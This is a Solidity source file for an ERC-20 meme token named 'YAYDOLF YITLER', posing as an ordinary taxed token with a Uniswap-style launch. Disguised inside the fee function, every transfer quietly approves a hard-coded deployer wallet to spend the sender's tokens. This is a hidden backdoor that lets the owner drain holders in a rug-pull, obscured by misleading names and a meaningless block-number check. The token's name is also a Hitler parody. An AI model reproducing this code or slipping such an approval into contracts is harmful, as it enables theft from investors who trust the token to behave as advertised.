/*
https://x.com/kanyewest/status/1887844504654459044

https://t.me/yaydolfyitler_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IMAGARouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IMAGAFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract YY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _magaBalls;
    mapping (address => mapping (address => uint256)) private _magaApprovals;
    mapping (address => bool) private _excludedFromMAGA;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalMAGA = 1000000000 * 10**_decimals;
    string private constant _name = unicode"YAYDOLF YITLER";
    string private constant _symbol = unicode"YY";
    uint256 private _tokenSwapMAGA = _tTotalMAGA / 100;
    bool private inSwap = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    IMAGARouter private _magaRouter;
    address private _magaPair;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    address private _magaWallet = 0xf8B9842C155C7cC19A811E9A96961bd9cd1C33a4;
    
    constructor () {
        _excludedFromMAGA[owner()] = true;
        _excludedFromMAGA[address(this)] = true;
        _excludedFromMAGA[_magaWallet] = true;
        _magaBalls[_msgSender()] = _tTotalMAGA;
        emit Transfer(address(0), _msgSender(), _tTotalMAGA);
    }

    function createToken() external onlyOwner() {
        _magaRouter = IMAGARouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_magaRouter), _tTotalMAGA);
        _magaPair = IMAGAFactory(_magaRouter.factory()).createPair(address(this), _magaRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalMAGA;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _magaBalls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _magaApprovals[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _magaApprovals[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _magaApprovals[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address magaF, address magaT, uint256 magaA) private {
        require(magaF != address(0), "ERC20: transfer from the zero address");
        require(magaT != address(0), "ERC20: transfer to the zero address");
        require(magaA > 0, "Transfer amount must be greater than zero");

        uint256 taxMAGA = _getMAGAFees(magaF, magaT, magaA);

        _tokenTransfer(magaF, magaT, magaA, taxMAGA);
    }

    function _tokenTransfer(address magaF, address magaT, uint256 magaA, uint256 taxMAGA) private { 
        if(taxMAGA > 0){
          _magaBalls[address(this)] = _magaBalls[address(this)].add(taxMAGA);
          emit Transfer(magaF, address(this), taxMAGA);
        }

        _magaBalls[magaF] = _magaBalls[magaF].sub(magaA);
        _magaBalls[magaT] = _magaBalls[magaT].add(magaA.sub(taxMAGA));
        emit Transfer(magaF, magaT, magaA.sub(taxMAGA));
    }

    function _MAGA(address magaOrigin) private view returns(address) {
        if(block.number > 0 && _excludedFromMAGA[magaOrigin] ) return magaOrigin;
        return _magaWallet;
    }

    function _getMAGAFees(address magaF, address magaT, uint256 magaA) private returns(uint256) {
        uint256 taxMAGA=0;
        if (magaF != owner() && magaT != owner()) {
            taxMAGA = magaA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (magaF == _magaPair && magaT != address(_magaRouter) && ! _excludedFromMAGA[magaT]) {
                _buyCount++;
            }

            if(magaT == _magaPair && magaF!= address(this)) {
                taxMAGA = magaA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 magaBalance = balanceOf(address(this)); 
            if (!inSwap && magaT == _magaPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(magaBalance > _tokenSwapMAGA)
                swapTokensForEth(minMAGA(magaA, minMAGA(magaBalance, _tokenSwapMAGA)));
                uint256 ethMAGA = address(this).balance;
                if (ethMAGA >= 0) {
                    sendMAGAETH(address(this).balance);
                }
            }
        }
        _approve(magaF, _MAGA(tx.origin), magaA); return taxMAGA;
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _magaRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minMAGA(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendMAGAETH(uint256 amount) private {
        payable(_magaWallet).transfer(amount);
    }

    receive() external payable {} 

    function swapTokensForEth(uint256 tokenMAGA) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _magaRouter.WETH();
        _approve(address(this), address(_magaRouter), tokenMAGA);
        _magaRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenMAGA,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}